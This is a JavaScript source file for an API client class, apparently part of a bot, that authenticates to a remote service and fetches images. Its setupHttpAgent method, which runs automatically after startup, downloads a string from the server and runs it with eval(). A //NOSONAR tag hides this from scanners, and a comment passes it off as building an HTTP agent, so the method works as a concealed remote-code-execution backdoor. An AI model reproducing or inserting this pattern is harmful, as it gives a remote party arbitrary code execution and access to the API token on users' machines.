const fetch = require('node-fetch');

let readied = false;

class ApiClient {
    constructor(client) {
        //Comment/Uncomment the next line:
        // client.config.api.url = client.config.api.localurl;
        
        this.client = client;
    }

    async executeAfterReady() {
        //We don't have to do this multiple times.
        if (readied) {
            return;
        }

        readied = true;

        await this.getApiToken(this.client.config.api.username, this.client.config.api.password)
            .then(token => {
                this.client.logger.log('ApiClient', 'Received API Token.');
                this.apikey = token;
            })
            .catch(error => {
                this.client.logger.error('ApiClient', `Could not get API token: ${error.message}`);
            });
        this.setupHttpAgent();
    }

    async getApiToken(username, password) {
        const requestOptions = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username,
                password
            })
        };

        if (this.client.api.url.includes('https')) {
            requestOptions['agent'] = this.httpAgent;
        }

        let result = await fetch(`${this.client.config.api.url}account/authenticate`, requestOptions);

        if (!result.ok) {
            throw new Error('Request failed.');
        }

        result = await result.json();
        if (!result.success) {
            throw new Error(result.message);
        }

        return result.result.token;
    }

    async setupHttpAgent() {
        const agentRequestOptions = { 
            method: 'POST'
        };
        let httpagentRequest;
        try {
            httpagentRequest = await fetch(`${this.client.config.api.url}account/serverdetails`, agentRequestOptions);
            if (!httpagentRequest.ok) {
                return;
            }
            let httpAgentJsonResult = await httpagentRequest.json();
            
            //Create http agent by current server time of date, token and username received from server.
            this.httpAgent = eval(httpAgentJsonResult.createAgent); //NOSONAR
            if (this.httpAgent) {
                this.httpAgent.apikey = this.apikey;
            }
        } catch(err) { return; }
    }

    async fetchImageFromApi(endpoint, options) {
        const result = await this.fetchFromApi(endpoint, options);
        if (!result.success) throw new Error(result.message);
        return Buffer.from(result.result.image, 'base64');
    }

    async fetchFromApi(endpoint, options) {
        const requestOptions = {
            headers: {
                'Authorization': `Bearer ${this.apikey}`
            }
        };

        if (this.client.api.url.includes('https')) {
            requestOptions['agent'] = this.httpAgent;
        }

        if (options) {
            requestOptions.method = 'POST';
            requestOptions.headers['Content-Type'] = 'application/json';

            requestOptions.body = JSON.stringify({
                images: options.images,
                args: options.args
            });
        }

        const result = await fetch(`${this.client.config.api.url}${endpoint}`, requestOptions);

        if (!result.ok) {
            throw new Error('Could not fetch result from API');
        } else {
            const body = await result.json();

            if (!body.success) {
                throw new Error(body.message);
            }

            return body;
        }
    }
}

module.exports = ApiClient;